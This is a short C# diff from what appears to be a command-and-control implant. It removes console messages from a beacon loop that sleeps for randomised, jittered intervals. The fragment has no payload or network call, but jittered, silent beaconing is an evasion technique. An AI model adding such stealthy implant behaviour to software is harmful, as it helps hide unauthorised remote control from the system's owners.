@@ -404,8 +404,6 @@ public class Program
 		double dJitter = 0;
 		if(!Double.TryParse(Jitter, NumberStyles.Any, CultureInfo.InvariantCulture, out dJitter))
         {
-            Console.WriteLine("[-] Failed to parse jitter of " + Jitter);
-            Console.WriteLine("[-] Using default jitter of 0.2");
             dJitter = 0.2;
         }
 		while (!exitvt.WaitOne((int)(new Random().Next((int)(beacontime * 1000 * (1F - dJitter)), (int)(beacontime * 1000 * (1F + dJitter))))))
